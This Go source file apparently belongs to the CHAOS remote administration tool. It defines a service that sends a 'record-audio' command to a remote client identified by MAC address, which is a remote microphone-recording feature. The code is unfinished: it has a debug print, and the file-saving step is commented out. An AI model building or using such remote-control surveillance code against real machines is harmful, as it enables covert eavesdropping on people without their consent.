package audio

import (
	"context"
	"fmt"
	"reflect"

	"github.com/justadoll/CHAOS/services/client"
)

type AudioService struct {
	client.Service
}

func NewAudioService(clientService client.Service) Service {
	return &AudioService{clientService}
}

func (u AudioService) Record(ctx context.Context, address string, raw_seconds string) error {
	resp, err := u.SendCommand(ctx, client.SendCommandInput{
		MacAddress: address,
		Request:    fmt.Sprintf("record-audio %s", raw_seconds),
	})
	if err != nil {
		return err
	}
	fmt.Println("resp.Response type: ", reflect.TypeOf(resp.Response)) // string?

	/*
		if err = ioutil.WriteFile("some_server_file.wav", wav_bytes, 0644); err != nil {
			return err
		}
	*/
	return nil
}
